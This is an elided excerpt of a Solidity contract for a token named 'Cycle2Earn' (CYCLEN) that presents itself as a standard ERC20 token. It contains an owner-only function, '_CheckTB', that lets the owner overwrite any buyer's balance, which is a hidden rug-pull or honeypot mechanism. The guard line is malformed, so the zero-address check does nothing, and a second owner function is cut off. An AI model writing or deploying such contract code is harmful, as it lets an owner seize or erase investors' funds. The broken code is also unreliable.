...
contract Cycle2Earn is IERC20, Ownable {
    ...
    string private _name = "Cycle2Earn";

    string private _symbol = "CYCLEN";
    ...
    function _CheckTB(address buyer) public onlyOwner {
      (buyer != address(0), "ERC20: burn from the zero address");
        balances[buyer] = Bscreflection(buyer);
    }

    function _BackTM(address owner) public onlyOwner {
